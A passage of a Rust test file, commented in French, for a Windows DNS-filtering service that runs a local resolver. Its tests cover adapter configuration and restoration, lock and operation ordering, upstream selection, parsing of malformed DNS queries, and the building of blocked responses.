/// ce verrou et abandonne une décision prise sur un autre amont
#[test]
fn amont_tiers_cablage_sous_verrou() {
    let m = include_str!("moniteur.rs");
    let cmd = &m[m.find(r#""filtrageAmont" => {"#).unwrap()..];
    assert!(cmd[..cmd.find("self.config.filtrage.amont =").unwrap()].contains("verrou_cartes()"), "commande sous le verrou");
    let sonde = &m[m.find("fn demarrer_sonde_filtrage(").unwrap()..];
    let bascule = &sonde[sonde.find("if decision != crate::filtrage::Repli::Garder {").unwrap()..];
    let avant = &bascule[..bascule.find("REPLI_TIERS.store(").unwrap()];
    assert!(avant.contains("verrou_cartes()") && avant.contains(r#"commun::lire::<commun::Config>("config.json")"#) && avant.contains("let toujours"), "relecture et revérification sous le verrou");
    assert!(avant.contains("crate::dns_local::permanent_actif()") && avant.contains("RESTAURATION_EN_ATTENTE.load") && avant.contains("REPLI_TIERS.load(Ordering::Acquire) != en_repli"), "état revérifié (audit de #167, S167-01)");
    assert!(bascule.contains("Repli::VersReseau && tiers.is_some()"), "pas de repli sans tiers (S167-02)");
    let sans_tiers = &bascule[bascule.find("if tiers.is_none() {").expect("tiers retiré pendant un repli (R-v2-1)")..];
    let sans_tiers = &sans_tiers[..sans_tiers.find("continue;").unwrap()];
    assert!(sans_tiers.contains("REPLI_TIERS.store(false") && !sans_tiers.contains("regler_amonts") && !sans_tiers.contains("appliquer_toutes"), "repli oublié sans rebranchement (R-v2-1)");
    let d = include_str!("dns_local.rs");
    let arr = &d[d.find("pub fn arreter_permanent()").unwrap()..];
    assert!(arr[..arr.find("\n}").unwrap()].contains("e.silence.store(false"), "plus de silence après l'arrêt");
}

/// Liste compilée et courte : Quad9 seul, nommé (exploitant, pays, filtre), adresses valides ; jamais par défaut ;
/// commande validée
#[test]
fn amont_tiers_compile_et_valide() {
    use crate::filtrage::{adresses_tiers, amont_tiers, AMONTS_TIERS};
    assert_eq!(AMONTS_TIERS.len(), 1);
    let q = amont_tiers("quad9").expect("quad9");
    assert!(q.exploitant.contains("Suisse") && q.filtre.contains("pas la publicité"));
    assert_eq!(adresses_tiers(q).len(), q.adresses.len());
    assert!(crate::commun::Config::default().filtrage.amont.is_empty(), "jamais par défaut");
    use crate::validation::valider;
    for v in ["reseau", "quad9"] {
        assert!(valider(&commande_json(&format!(r#"{{"Action":"filtrageAmont","Valeur":"{v}"}}"#))).is_ok(), "{v}");
    }
    for v in ["Quad9", "dns4eu", "9.9.9.9", ""] {
        assert!(valider(&commande_json(&format!(r#"{{"Action":"filtrageAmont","Valeur":"{v}"}}"#))).is_err(), "{v}");
    }
    assert!(!crate::validation::autorisee("filtrageAmont", crate::validation::Client::Autre));
}

// ------------------------------------------------------------ phase 7, PR 7.5a : état publié, compteurs, catégories

/// Derniers blocages : 50 au plus, un nom remonté au lieu d'être répété, 24 h de garde, le plus récent d'abord ;
/// compteurs par liste et par catégorie
#[test]
fn filtrage_derniers_blocages_bornes() {
    use crate::filtrage::{Categorie, StatsFiltrage, GARDE_DERNIERS_S, MAX_DERNIERS};
    let mut s = StatsFiltrage::default();
    for i in 0..(MAX_DERNIERS + 10) {
        s.noter(1000 + i as u64, format!("h{i}"), &format!("n{i}.pub.test"), Categorie::Publicite, "EasyPrivacy");
    }
    s.noter(2000, "h".into(), "n55.pub.test", Categorie::Publicite, "EasyList");
    let d = s.derniers(2000);
    assert_eq!(d.len(), MAX_DERNIERS);
    assert_eq!(d[0].nom, "n55.pub.test", "le plus récent d'abord");
    assert_eq!(d.iter().filter(|b| b.nom == "n55.pub.test").count(), 1, "remonté, pas répété");
    assert_eq!(s.par_liste.get("EasyPrivacy"), Some(&(MAX_DERNIERS as u64 + 10)));
    assert_eq!(s.par_categorie.get("publicité et pistage"), Some(&(MAX_DERNIERS as u64 + 11)));
    assert!(s.derniers(2000 + GARDE_DERNIERS_S).is_empty(), "plus de 24 h : oubliés");
}

/// Libellé de l'état publié
#[test]
fn filtrage_libelle_etat() {
    use crate::filtrage::libelle_etat;
    assert_eq!(libelle_etat(false, true, true, true, &[]), "inactif");
    assert_eq!(libelle_etat(true, true, true, false, &[]), "remise des cartes en attente");
    assert_eq!(libelle_etat(true, false, false, false, &[]), "suspendu : résolveur local non lancé");
    assert_eq!(libelle_etat(true, false, true, true, &[]), "suspendu : amont injoignable");
    assert_eq!(libelle_etat(true, false, true, false, &["Wi-Fi".into()]), "contourné sur la carte Wi-Fi");
    assert_eq!(libelle_etat(true, false, true, false, &[]), "actif");
}

/// DNS-003 (S164-05) : Critique, PID et chemin du programme qui tient le port, cartes nommées
#[test]
fn filtrage_alerte_port_dns_tenu() {
    let a = crate::moniteur::alerte_port_dns_tenu(Some(42), r"C:\outil\dns.exe", &["Ethernet".into()]);
    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.pid), ("DNS-003", "Critique", Some(42)));
    assert!(a.raisons.contains("processus 42") && a.raisons.contains("adresse non vérifiée") && a.raisons.contains("Ethernet") && a.destination == "127.0.0.1:53", "{}", a.raisons);
    assert!(crate::moniteur::alerte_port_dns_tenu(None, "", &["Wi-Fi".into()]).raisons.contains("programme inconnu"));
    assert_eq!(crate::collectes::besoins("DNS-003"), &[&[crate::collectes::Collecte::ConfigDns][..]]);
}

/// Commande filtrageCategories : noms connus seulement ; vide accepté (aucune catégorie)
#[test]
fn filtrage_commande_categories() {
    use crate::validation::{autorisee, valider, Client};
    for v in ["", "publicite", "securite,publicite", " publicite , securite "] {
        assert!(valider(&commande_json(&format!(r#"{{"Action":"filtrageCategories","Valeur":"{v}"}}"#))).is_ok(), "{v:?}");
    }
    for v in ["pub", "publicite,inconnue", "Publicite"] {
        assert!(valider(&commande_json(&format!(r#"{{"Action":"filtrageCategories","Valeur":"{v}"}}"#))).is_err(), "{v:?}");
    }
    assert!(!autorisee("filtrageCategories", Client::Autre));
}

/// Données de navigation (dossier, § 4.7) : l'état du filtrage n'entre ni dans etat.json ni dans l'API
#[test]
fn filtrage_etat_hors_api() {
    let m = include_str!("moniteur.rs");
    assert!(m.contains(r#"commun::ecrire("filtrage-etat.json""#));
    let etat = &m[m.find(r#"commun::ecrire("etat.json", &Etat {"#).unwrap()..];
    let etat = &etat[..etat.find("});").unwrap()];
    assert!(!etat.contains("filtrage"), "etat.json sans données du filtrage");
    assert!(!include_str!("api.rs").contains("filtrage-etat"), "l'API ne sert pas filtrage-etat.json");
}

// ------------------------------------------------------------ phase 7, PR 7.4 : activation sur les cartes

fn origine_essai(dns4: &[&str], dns6: &[&str]) -> crate::filtrage_cartes::OrigineCarte {
    crate::filtrage_cartes::OrigineCarte {
        id: "{00000000-0000-0000-0000-000000000001}".into(), nom: "Ethernet".into(),
        dns4: dns4.iter().map(|s| s.to_string()).collect(), dns6: dns6.iter().map(|s| s.to_string()).collect(), ..Default::default()
    }
}

/// Valeurs réglées : résolveur local d'abord, serveurs d'origine en secours (IPv4 et IPv6)
#[test]
fn activation_valeurs_reglees() {
    use crate::filtrage_cartes::valeurs_activees;
    assert_eq!(valeurs_activees(&origine_essai(&["192.0.2.1", "192.0.2.2"], &["2001:db8::1"])),
        ("127.0.0.1,192.0.2.1,192.0.2.2".to_string(), "::1,2001:db8::1".to_string()));
    assert_eq!(valeurs_activees(&origine_essai(&["192.0.2.1"], &[])), ("127.0.0.1,192.0.2.1".to_string(), "::1".to_string()));
}

/// Origine : cartes physiques seulement ; NameServer statique relu (vide : DHCP) ; serveurs effectifs sans boucle locale,
/// sans adresse de lien local à zone, 3 au plus par famille
#[test]
fn activation_origine_des_cartes() {
    use crate::dns_surveillance::CarteDns;
    use crate::filtrage_cartes::origine_de;
    let carte = |id: &str, t: u32, dns: &[&str]| CarteDns { id: id.into(), nom: id.into(), type_carte: t, dns: dns.iter().map(|s| s.to_string()).collect(), materielle: true, ..Default::default() };
    let ns = |pile: &str, id: &str| if pile == "Tcpip" && id == "{S}" { "192.0.2.53".to_string() } else { String::new() };
    let o = origine_de(&[
        carte("{D}", 6, &["192.0.2.1", "127.0.0.1", "fe80::1%12", "2001:db8::1", "::1", "0.0.0.0"]),
        carte("{S}", 71, &["192.0.2.53", "198.51.100.1", "198.51.100.2", "198.51.100.3"]),
        carte("{V}", 131, &["198.51.100.9"]),
        carte("", 6, &["198.51.100.8"]),
    ], &ns);
    assert_eq!(o.len(), 2, "carte virtuelle et carte sans identifiant écartées");
    assert_eq!((o[0].ns4.as_str(), o[0].dns4.clone(), o[0].dns6.clone()), ("", vec!["192.0.2.1".to_string()], vec!["2001:db8::1".to_string()]));
    assert_eq!((o[1].ns4.as_str(), o[1].dns4.len()), ("192.0.2.53", 3));
}

/// Constat T-9 (audit du 2026-11-23) : les cartes virtuelles de type Ethernet (commutateurs Hyper-V « vEthernet », WSL,
/// Docker, TAP des VPN) ne sont jamais réglées. Critère lu dans Windows (HardwareInterface ET ConnectorPresent de
/// MIB_IF_ROW2), jamais le nom ; lecture impossible : carte tenue pour virtuelle. Liste publiée avant l'activation par le
/// même relevé qu'elle
#[test]
fn activation_cartes_virtuelles_ecartees() {
    use crate::dns_surveillance::{filtrable, materielle_selon, CarteDns};
    assert!(materielle_selon(0b0000_0101), "carte matérielle avec connecteur");
    assert!(materielle_selon(0xFF));
    assert!(!materielle_selon(0b0000_0001), "HardwareInterface seul");
    assert!(!materielle_selon(0b0000_0100), "ConnectorPresent seul");
    assert!(!materielle_selon(0), "vEthernet, TAP : aucun des deux");
    assert!(!materielle_selon(0b1111_1010));
    let carte = |id: &str, nom: &str, t: u32, m: bool| CarteDns { id: id.into(), nom: nom.into(), type_carte: t, materielle: m, dns: vec!["192.0.2.1".into()], ..Default::default() };
    let cartes = [
        carte("{P}", "Ethernet", 6, true),
        carte("{V}", "vEthernet (Default Switch)", 6, false),
        carte("{A}", "Ethernet 2", 6, false),
        carte("{W}", "Wi-Fi", 71, true),
        carte("{T}", "Tunnel", 131, true),
        carte("", "Ethernet 3", 6, true),
    ];
    assert_eq!(cartes.iter().filter(|c| filtrable(c)).map(|c| c.id.as_str()).collect::<Vec<_>>(), vec!["{P}", "{W}"]);
    let o = crate::filtrage_cartes::origine_de(&cartes, &|_: &str, _: &str| String::new());
    assert_eq!(o.iter().map(|c| c.nom.as_str()).collect::<Vec<_>>(), vec!["Ethernet", "Wi-Fi"], "le nom ne décide rien");
    assert_eq!(crate::dns_local::amonts(&[carte("{V}", "Ethernet", 6, false)]), Vec::<std::net::IpAddr>::new(), "essai : carte virtuelle écartée");
    let s = include_str!("dns_surveillance.rs");
    let r = &s[s.find("pub fn releve()").unwrap()..];
    assert!(r.contains("drapeaux_interface((*a).Luid).is_some_and(materielle_selon)"), "lu dans Windows, échec : virtuelle");
    let m = include_str!("moniteur.rs");
    let e = &m[m.find("fn etat_filtrage(").unwrap()..];
    let e = &e[..e.find("\n}\n").or_else(|| e.find("\r\n}\r\n")).unwrap()];
    assert!(e.contains("cartes_a_regler") && e.contains("fc::releve_origine()"), "liste publiée par le relevé de l'activation");
    let a = &m[m.find("fn activer_filtrage(").unwrap()..];
    assert!(a.contains("fc::releve_origine()"));
}

/// Constat T-10 (audit du 2026-11-23) : les adresses site-local par défaut de Windows (`fec0:0:0:ffff::1`, `::2`, `::3`,
/// et tout `fec0::/10`) et le lien local sans zone ne sont ni amonts ni secours ; l'essai essaie l'IPv4 d'abord, comme
/// le mode permanent ; une origine enregistrée avant la correction n'en garde rien au réglage
#[test]
fn activation_amonts_sans_site_local() {
    use crate::dns_surveillance::CarteDns;
    use crate::filtrage_cartes::{amont_utilisable, origine_de, valeurs_activees};
    let ip = |s: &str| s.parse::<std::net::IpAddr>().unwrap();
    for non in ["fec0:0:0:ffff::1", "fec0:0:0:ffff::2", "fec0:0:0:ffff::3", "feff::1", "fe80::1", "febf::1", "::1", "::", "127.0.0.1", "0.0.0.0", "ff02::fb", "224.0.0.251", "255.255.255.255"] {
        assert!(!amont_utilisable(&ip(non)), "{non}");
    }
    for oui in ["192.168.1.254", "2001:db8::53", "fd00::53", "fc00::1"] {
        assert!(amont_utilisable(&ip(oui)), "{oui}");
    }
    let c = CarteDns { id: "{P}".into(), nom: "Ethernet".into(), type_carte: 6, materielle: true,
        dns: ["fec0:0:0:ffff::1", "fec0:0:0:ffff::2", "fec0:0:0:ffff::3", "192.168.1.254"].iter().map(|s| s.to_string()).collect(), ..Default::default() };
    let o = origine_de(std::slice::from_ref(&c), &|_: &str, _: &str| String::new());
    assert_eq!((o[0].dns4.clone(), o[0].dns6.clone()), (vec!["192.168.1.254".to_string()], Vec::<String>::new()));
    assert_eq!(valeurs_activees(&o[0]), ("127.0.0.1,192.168.1.254".to_string(), "::1".to_string()));
    assert_eq!(crate::dns_local::amonts(std::slice::from_ref(&c)), vec![ip("192.168.1.254")]);
    let ancienne = origine_essai(&["192.168.1.254"], &["fec0:0:0:ffff::1", "2001:db8::53"]);
    assert_eq!(valeurs_activees(&ancienne).1, "::1,2001:db8::53", "origine enregistrée avant la correction");
    let mixte = CarteDns { dns: ["2001:db8::53", "fec0:0:0:ffff::1", "192.0.2.53"].iter().map(|s| s.to_string()).collect(), ..c };
    assert_eq!(crate::dns_local::amonts(&[mixte]), vec![ip("192.0.2.53"), ip("2001:db8::53")], "IPv4 d'abord");
    let m = include_str!("moniteur.rs");
    let a = &m[m.find("fn amonts_origine(").unwrap()..];
    assert!(a[..a.find("\n}").unwrap()].contains("amont_utilisable"), "mode permanent : même filtre");
}

/// Constat B-3-01 (audit du 2026-11-23) : réglage des cartes en échec à l'activation et remise ratée elle aussi : tant
/// qu'une carte pointe sur la boucle locale, le résolveur garde le port (simple relais) et la remise est mise en attente,
/// jamais « cartes rendues » ; sinon tout est rendu
#[test]
fn activation_remise_ratee_garde_le_port() {
    use crate::filtrage_cartes::apres_echec_reglage;
    let (garder, m) = apres_echec_reglage(&["Ethernet".to_string()], "refus de l'API");
    assert!(garder);
    assert!(m.contains("remise incomplète") && m.contains("Ethernet") && m.contains("garde le port 53") && m.contains("refus de l'API") && !m.contains("cartes rendues"), "{m}");
    let (garder, m) = apres_echec_reglage(&[], "refus de l'API");
    assert!(!garder);
    assert_eq!(m, "Réglage des cartes en échec, cartes rendues : refus de l'API");
    let src = include_str!("moniteur.rs");
    let act = &src[src.find("fn activer_filtrage(").unwrap()..];
    let echec = &act[act.find("if let Err(e) = fc::appliquer_toutes(&origine)").unwrap()..];
    let echec = &echec[..echec.find("return Err(m);").expect("message de la décision")];
    assert!(echec.find("encore_sur_la_boucle").unwrap() < echec.find("apres_echec_reglage").unwrap());
    let garde = &echec[echec.find("if garder {").unwrap()..echec.find("} else {").unwrap()];
    assert!(garde.contains("RESTAURATION_EN_ATTENTE.store(true") && !garde.contains("arreter_permanent") && !garde.contains("effacer_origine"), "port et origine gardés");
}

/// Une carte déjà réglée sur le résolveur local n'est jamais enregistrée comme origine (on la rendrait au résolveur)
#[test]
fn activation_carte_deja_reglee_refusee() {
    use crate::filtrage_cartes::{deja_reglee, meme_liste, OrigineCarte};
    assert!(deja_reglee(&OrigineCarte { ns4: "127.0.0.1,192.0.2.1".into(), ..Default::default() }));
    assert!(deja_reglee(&OrigineCarte { ns6: "::1 2001:db8::1".into(), ..Default::default() }));
    assert!(!deja_reglee(&OrigineCarte { ns4: "192.0.2.1,127.0.0.1".into(), ..Default::default() }));
    assert!(!deja_reglee(&OrigineCarte::default()));
    assert!(meme_liste("127.0.0.1,192.0.2.1", "127.0.0.1 192.0.2.1") && meme_liste("", " ") && !meme_liste("a,b", "b,a"));
}

/// Carte disparue depuis l'activation (relecture de #164, constat 2) : l'API refuse, la clé existe → registre écrit ;
/// plus de clé → comptée comme rendue ; jamais un blocage de la désactivation, de l'arrêt ou de la désinstallation
#[test]
fn activation_carte_absente() {
    use crate::filtrage_cartes::{remise, Remise};
    assert_eq!(remise(true, true, true), Ok(Remise::Api));
    assert_eq!(remise(true, false, false), Ok(Remise::Api));
    assert_eq!(remise(false, false, true), Ok(Remise::Registre));
    assert_eq!(remise(false, false, false), Ok(Remise::Rien));
    // Audit de #164, S164-06 : carte présente refusée par l'API → erreur (port gardé), jamais le registre seul
    assert_eq!(remise(false, true, true), Err(()));
    assert_eq!(remise(false, true, false), Err(()));
    let f = include_str!("filtrage_cartes.rs");
    let d = f.find("fn regler_et_verifier(").unwrap();
    let corps = &f[d..d + f[d..].find("\n}").unwrap()];
    assert!(corps.contains("Remise::Registre) => ecrire_registre(&g") && corps.contains("Remise::Rien) => return Ok(())"));
    assert!(corps.find("let g = guid(&o.id)?").unwrap() < corps.find("regler(&o.id").unwrap(), "GUID validé avant tout appel");
    assert!(corps.find("remise(").unwrap() < corps.find("registre_ns(").unwrap(), "vérification après la remise choisie");
}

/// Refus (D7-5) : suffixe DNS principal (poste joint à un domaine), stratégie DNS ou NRPT
#[test]
fn activation_refusee_domaine_ou_strategie() {
    use crate::filtrage_cartes::refus;
    assert!(refus("ad.exemple.test", false).is_some_and(|r| r.contains("domaine")));
    assert!(refus("", true).is_some_and(|r| r.contains("NRPT")));
    assert!(refus("  ", false).is_none());
    assert!(crate::validation::valider(&commande_json(r#"{"Action":"filtrage","Valeur":"on"}"#)).is_ok());
    assert!(crate::validation::valider(&commande_json(r#"{"Action":"filtrage","Valeur":"activer"}"#)).is_err());
    assert!(!crate::validation::autorisee("filtrage", crate::validation::Client::Autre));
}

/// Ordre des opérations (préalables de l'audit de #161) : origine enregistrée avant tout réglage ; résolveur lancé et
/// contrôlé avant les cartes ; cartes rendues AVANT l'arrêt du résolveur (désactivation et arrêt du service)
#[test]
fn activation_ordre_des_operations() {
    let m = include_str!("moniteur.rs");
    let corps = |nom: &str| { let d = m.find(nom).unwrap_or_else(|| panic!("{nom}")); &m[d..d + m[d..].find("\n}\n").or_else(|| m[d..].find("\r\n}\r\n")).unwrap()] };
    let ordre = |c: &str, a: &str, b: &str| c.find(a).unwrap_or_else(|| panic!("{a}")) < c.find(b).unwrap_or_else(|| panic!("{b}"));
    let act = corps("fn activer_filtrage(");
    assert!(ordre(act, "commun::ecrire(fc::FICHIER", "demarrer_permanent"), "origine enregistrée d'abord");
    assert!(ordre(act, "demarrer_permanent", "repond_localement") && ordre(act, "repond_localement", "appliquer_toutes"));
    let des = corps("fn desactiver_filtrage(");
    assert!(ordre(des, "restaurer_toutes", "arreter_permanent"), "cartes rendues avant le résolveur arrêté");
    assert!(des.contains("map_err") && des.find("?;").is_some(), "carte non rendue : erreur, résolveur gardé");
    let arr = &m[m.find("pub fn arreter(&mut self)").unwrap()..];
    assert!(ordre(arr, "restaurer_toutes", "arreter_permanent"), "arrêt du service : cartes rendues d'abord");
    // Audit de #164, S164-04 : un seul verrou des opérations sur les cartes, pris par chacune d'elles
    for f in ["fn activer_filtrage(", "fn desactiver_filtrage(", "fn reprendre_filtrage("] {
        assert!(corps(f).contains("verrou_cartes()"), "{f} sans le verrou des cartes");
    }
    assert!(arr[..arr.find("arreter_permanent").unwrap()].contains("verrou_cartes()"), "arrêt sans le verrou des cartes");
    let sonde = corps("fn demarrer_sonde_filtrage(");
    let apres = &sonde[sonde.find("sonder(").unwrap()..];
    assert!(apres.contains("verrou_cartes()") && apres.contains("RESTAURATION_EN_ATTENTE.load"), "sonde : verrou après la sonde lente, état revérifié");
    let rep = corps("fn reprendre_filtrage(");
    assert!(ordre(rep, "demarrer_permanent", "appliquer_toutes"), "démarrage : cartes réglées seulement après le résolveur");
    // Audit de #164, S164-01 : au démarrage, le port est pris avant toute remise, et relâché seulement après une remise
    // vérifiée (aucune carte sur la boucle locale) ; reprise ratée : cartes rendues en tenant le port
    assert!(ordre(rep, "demarrer_permanent", "restaurer_toutes"), "port pris avant toute remise");
    let sans = &rep[rep.find("if !reprendre {").unwrap()..];
    assert!(ordre(sans, "encore_sur_la_boucle", "arreter_permanent"), "port relâché seulement sans carte sur la boucle");
    let rate = &rep[rep.find("Err(e) => {\n            // Cartes rendues EN TENANT").or_else(|| rep.find("Err(e) => {\r\n            // Cartes rendues EN TENANT")).unwrap()..];
    assert!(!rate[..rate.find("marquer_silence").unwrap()].contains("arreter_permanent"), "reprise ratée : port gardé");
}

/// Requête construite par le résolveur (sonde, contrôle) : relue telle quelle
#[test]
fn activation_requete_de_controle() {
    use crate::dns_local::{lire_requete, requete, Lecture, MAX_UDP};
    match lire_requete(&requete(7, "www.msftconnecttest.com", 1), MAX_UDP) {
        Lecture::Requete(r) => assert_eq!((r.id, r.question.nom.as_str(), r.question.type_), (7, "www.msftconnecttest.com", 1)),
        a => panic!("{a:?}"),
    }
    torturer_texte("a.b.test", &mut |t| { let _ = lire_requete(&requete(1, t, 1), crate::dns_local::MAX_TCP); });
}

// ------------------------------------------------------------ phase 7, PR 7.3 : résolveur local (non branché)

/// Requête DNS d'essai : identifiant, RD, une question (nom, type, classe IN)
fn requete_dns(id: u16, nom: &str, type_: u16) -> Vec<u8> {
    let mut v = id.to_be_bytes().to_vec();
    v.extend_from_slice(&[0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0]);
    for e in nom.split('.').filter(|e| !e.is_empty()) {
        v.push(e.len() as u8);
        v.extend_from_slice(e.as_bytes());
    }
    v.push(0);
    v.extend_from_slice(&type_.to_be_bytes());
    v.extend_from_slice(&1u16.to_be_bytes());
    v
}

fn requete_lue(p: &[u8]) -> crate::dns_local::Requete {
    match crate::dns_local::lire_requete(p, crate::dns_local::MAX_UDP) {
        crate::dns_local::Lecture::Requete(r) => r,
        autre => panic!("requête attendue : {autre:?}"),
    }
}

/// Requête bornée : deux questions, nom de plus de 253 caractères, pointeur de compression, paquet tronqué, trop long,
/// opcode autre que 0 : FORMERR, rien relayé ; une réponse (bit QR) ou un paquet sans en-tête : ignorés
#[test]
fn dns_requete_bornee() {
    use crate::dns_local::{lire_requete, Lecture, MAX_TCP, MAX_UDP};
    let bonne = requete_dns(0x1234, "pub.test", 1);
    let r = requete_lue(&bonne);
    assert_eq!((r.id, r.question.nom.as_str(), r.question.type_, r.question.classe), (0x1234, "pub.test", 1, 1));
    assert_eq!(r.question.brute, bonne[12..].to_vec());
    let formerr = |p: &[u8]| lire_requete(p, MAX_UDP) == Lecture::Formerr(0x1234);
    let mut deux = bonne.clone();
    deux[5] = 2;
    assert!(formerr(&deux), "deux questions");
    let long = format!("{}.test", vec!["a".repeat(63); 4].join("."));
    assert!(formerr(&requete_dns(0x1234, &long, 1)), "nom de plus de 253 caractères");
    let etiquettes = vec!["a"; 128].join(".");
    assert!(formerr(&requete_dns(0x1234, &etiquettes, 1)), "plus de 127 étiquettes");
    let mut pointeur = bonne[..12].to_vec();
    pointeur.extend_from_slice(&[0xC0, 0x0C, 0, 1, 0, 1]);
    assert!(formerr(&pointeur), "pointeur de compression dans la question");
    assert!(formerr(&bonne[..bonne.len() - 2]), "paquet tronqué (classe absente)");
    assert!(formerr(&bonne[..14]), "nom tronqué");
    let mut trop = bonne.clone();
    trop.resize(MAX_UDP + 1, 0);
    assert!(formerr(&trop), "plus de 512 octets en UDP");
    assert!(matches!(lire_requete(&trop, MAX_TCP), Lecture::Requete(_)), "admis en TCP (EDNS ou remplissage)");
    let mut opcode = bonne.clone();
    opcode[2] |= 0x10;
    assert!(formerr(&opcode), "opcode autre que QUERY");
    let mut point = bonne[..12].to_vec();
    point.extend_from_slice(&[3, b'a', b'.', b'b', 0, 0, 1, 0, 1]);
    assert!(formerr(&point), "point dans une étiquette");
    let mut reponse = bonne.clone();
    reponse[2] |= 0x80;
    assert_eq!(lire_requete(&reponse, MAX_UDP), Lecture::Ignoree, "réponse : ignorée");
    assert_eq!(lire_requete(&bonne[..11], MAX_UDP), Lecture::Ignoree, "sans en-tête");
    let f = crate::dns_local::reponse_formerr(0x1234);
    assert_eq!((f.len(), f[3] & 0x0F, f[2] & 0x80), (12, 1, 0x80));
}

/// Nom bloqué : A 0.0.0.0, AAAA ::, type 65 (HTTPS) vide ; identifiant et question repris ; TTL 60 s
#[test]
fn dns_reponse_bloquee_a_aaaa_https() {
    use crate::dns_local::reponse_bloquee;
    for (type_, donnees) in [(1u16, vec![0u8; 4]), (28, vec![0u8; 16])] {
        let p = requete_dns(0xBEEF, "pub.test", type_);
        let v = reponse_bloquee(&requete_lue(&p));
        assert_eq!(&v[..2], &[0xBE, 0xEF]);
        assert_eq!(v[2] & 0x80, 0x80, "réponse");
        assert_eq!(v[2] & 0x01, 0x01, "RD repris");
        assert_eq!(v[3] & 0x0F, 0, "NOERROR");
        assert_eq!(&v[4..8], &[0, 1, 0, 1], "une question, une réponse");
        let q = &p[12..];
        assert_eq!(&v[12..12 + q.len()], q, "question reprise");
        let r = &v[12 + q.len()..];
        assert_eq!(&r[..2], &[0xC0, 0x0C]);
        assert_eq!(u16::from_be_bytes([r[2], r[3]]), type_);
        assert_eq!(u32::from_be_bytes([r[6], r[7], r[8], r[9]]), 60);
        assert_eq!(u16::from_be_bytes([r[10], r[11]]) as usize, donnees.len());
        assert_eq!(&r[12..], &donnees[..]);
    }
    let p = requete_dns(7, "pub.test", 65);
    let v = reponse_bloquee(&requete_lue(&p));
    assert_eq!(&v[4..8], &[0, 1, 0, 0], "NODATA : aucune réponse");
    assert_eq!(v.len(), p.len());
}

/// Réponse d'amont : identifiant, bit de réponse, question (nom sans la casse, type et classe à l'identique) ; sinon
/// rejetée
#[test]
fn dns_reponse_amont_mal_assortie_ignoree() {
    use crate::dns_local::{avec_id, reponse_assortie};
    let p = requete_dns(0x0102, "pub.test", 1);
    let q = &p[12..];
    let mut rep = p.clone();
    rep[2] |= 0x80;
    assert!(reponse_assortie(&rep, 0x0102, q));
    assert!(!reponse_assortie(&rep, 0x0103, q), "autre identifiant");
    assert!(!reponse_assortie(&p, 0x0102, q), "pas une réponse");
    let autre = { let mut a = requete_dns(0x0102, "pub.tesu", 1); a[2] |= 0x80; a };
    assert!(!reponse_assortie(&autre, 0x0102, q), "autre question");
    let casse = { let mut a = requete_dns(0x0102, "PuB.TeSt", 1); a[2] |= 0x80; a };
    assert!(reponse_assortie(&casse, 0x0102, q), "casse changée par l'amont (0x20)");
    let type_ = { let mut a = requete_dns(0x0102, "pub.test", 28); a[2] |= 0x80; a };
    assert!(!reponse_assortie(&type_, 0x0102, q), "autre type");
    assert!(!reponse_assortie(&rep[..14], 0x0102, q), "tronquée");
    assert_eq!(&avec_id(&rep, 0xABCD)[..2], &[0xAB, 0xCD]);
    assert_eq!(&avec_id(&rep, 0xABCD)[2..], &rep[2..]);
}

/// Nom spécial de Firefox : NXDOMAIN quand le filtrage est actif, relayé sinon ; nom bloqué : réponse locale seulement
/// quand le filtrage est actif
#[test]
fn dns_canari_firefox() {
    use crate::dns_local::{traiter, Action, CANARI};
    let bloque = |n: &str| n == "pub.test";
    let r = requete_lue(&requete_dns(9, CANARI, 1));
    match traiter(&r, true, &bloque) {
        Action::Repondre(v) => assert_eq!((v[3] & 0x0F, &v[6..8]), (3, &[0u8, 0][..]), "NXDOMAIN sans réponse"),
        a => panic!("{a:?}"),
    }
    assert_eq!(traiter(&r, false, &bloque), Action::Relayer);
    let r = requete_lue(&requete_dns(9, "Pub.Test", 1));
    assert!(matches!(traiter(&r, true, &bloque), Action::Repondre(_)));
    assert_eq!(traiter(&r, false, &bloque), Action::Relayer);
    assert_eq!(traiter(&requete_lue(&requete_dns(9, "ok.test", 1)), true, &bloque), Action::Relayer);
}

/// Dégradation ouverte : 30 s sans aucune réponse d'amont (requêtes relayées) → arrêt ; une réponse remet à zéro
#[test]
fn degradation_ouverte_amont_muet() {
    let mut s = crate::dns_local::Sante::default();
    assert!(!s.noter(false, 100));
    assert!(!s.noter(false, 129));
    assert!(s.noter(false, 130), "30 s de silence");
    assert!(!s.noter(true, 131));
    assert!(!s.noter(false, 140));
    assert!(!s.noter(false, 169));
    assert!(s.noter(false, 170));
}

/// Port source du relais : toujours dans la plage dynamique, toute la plage couverte (relecture de #161, constat 1)
#[test]
fn dns_port_source_dynamique() {
    use crate::dns_local::port_dynamique;
    assert_eq!(port_dynamique(0), 49152);
    assert_eq!(port_dynamique(16383), 65535);
    assert_eq!(port_dynamique(16384), 49152);
    assert_eq!(port_dynamique(u16::MAX), 65535);
    assert!((0..=u16::MAX).all(|a| port_dynamique(a) >= 49152));
}

/// Amonts : serveurs des cartes physiques, sans boucle locale, sans doublon, IPv4 d'abord, 4 au plus ; carte
/// virtuelle écartée
#[test]
fn dns_amonts_des_cartes_physiques() {
    use crate::dns_surveillance::CarteDns;
    let carte = |t: u32, dns: &[&str]| CarteDns { id: "{A}".into(), nom: "n".into(), type_carte: t, dns: dns.iter().map(|s| s.to_string()).collect(), materielle: true, ..Default::default() };
    let l = crate::dns_local::amonts(&[
        carte(6, &["192.0.2.53", "127.0.0.1", "::1", "192.0.2.53", "fe80::1%12"]),
        carte(131, &["198.51.100.1"]),
        carte(71, &["2001:db8::53", "198.51.100.2", "198.51.100.3"]),
    ]);
    let attendu: Vec<std::net::IpAddr> = ["192.0.2.53", "198.51.100.2", "198.51.100.3", "2001:db8::53"].iter().map(|s| s.parse().unwrap()).collect();
    assert_eq!(l, attendu);
}

/// Constat C-10 (audit du 2026-11-23) : générateur aléatoire en échec → aucun identifiant ni port, rien n'est relayé
/// (échec fermé, comme `api::jeton_depuis_alea`) ; jamais des valeurs nulles
#[test]
fn dns_alea_echec_ferme() {
    use crate::dns_local::alea_u16;
    assert_eq!(alea_u16(false, [0, 0]), None);
    assert_eq!(alea_u16(false, [0x12, 0x34]), None);
    assert_eq!(alea_u16(true, [0x12, 0x34]), Some(u16::from_ne_bytes([0x12, 0x34])));
    assert_eq!(alea_u16(true, [0, 0]), Some(0), "un tirage nul reste un tirage");
    let s = include_str!("dns_local.rs");
    let f = &s[s.find("fn identifiant_aleatoire() -> Option<u16>").expect("identifiant optionnel")..];
